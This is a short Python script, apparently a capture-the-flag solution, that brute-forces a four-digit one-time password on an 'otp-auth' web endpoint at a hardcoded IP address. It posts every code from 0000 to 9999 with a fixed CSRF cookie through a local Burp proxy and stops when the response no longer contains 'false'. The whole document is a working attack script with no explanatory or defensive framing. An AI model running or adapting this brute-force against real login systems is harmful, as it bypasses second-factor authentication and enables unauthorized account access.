from pwn import *


# p=remote("142.93.209.130",13010)

import requests

burp0_url = "http://142.93.209.130:8000/otp-auth"
burp0_cookies = {"csrftoken": "7QQifO2Eaob38GLRApUQgfveY6s9k35VPtklEyLlwHvxByaJdcwMkTWQiBoTCCMN"}
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0", "Accept": "application/json", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "http://142.93.209.130:8000/forums-login", "Content-Type": "application/json", "Origin": "http://142.93.209.130:8000", "Connection": "close"}
proxies={'http':'http://127.0.0.1:8080'}

for i in range(0,10):
	for j in range(0,10):
		for k in range(0,10):
			for l in range(0,10):
				res=str(i)+str(j)+str(k)+str(l)
				print(res)
				burp0_json={"otp": f"{res}"}
				r=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, json=burp0_json,proxies=proxies)
				print(r.text)
				if "false" not in r.text:
					print(res)
					exit()